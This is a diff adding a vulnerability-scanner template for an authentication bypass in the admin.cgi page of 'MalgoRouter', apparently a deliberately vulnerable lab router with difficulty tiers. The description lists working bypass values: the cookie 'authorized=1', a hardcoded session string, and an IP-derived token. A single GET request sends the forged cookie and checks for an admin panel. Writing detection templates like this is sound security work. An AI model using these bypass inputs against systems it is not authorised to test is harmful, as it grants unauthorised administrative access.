@@ -1,0 +1,34 @@
+id: malgorouter-admin-auth-bypass
+
+info:
+  name: MalgoRouter admin.cgi - Client-Controlled Authentication Bypass
+  author: opencode
+  severity: high
+  description: |
+    /cgi-bin/admin.cgi authorises on client-supplied values only. At the
+    default tier the cookie "authorized=1" is accepted (api.cgi maps it to
+    role legacy_admin); the medium tier accepts the hardcoded session value
+    "letmein_admin_2024"; the low tier accepts session=tok-<djb2(remote_ip)>.
+  classification:
+    cwe-id: CWE-306
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,auth-bypass,cwe-306
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/admin.cgi"
+    headers:
+      Cookie: "authorized=1; difficulty=high"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ADMIN_PANEL"
+      - type: status
+        status:
+          - 200
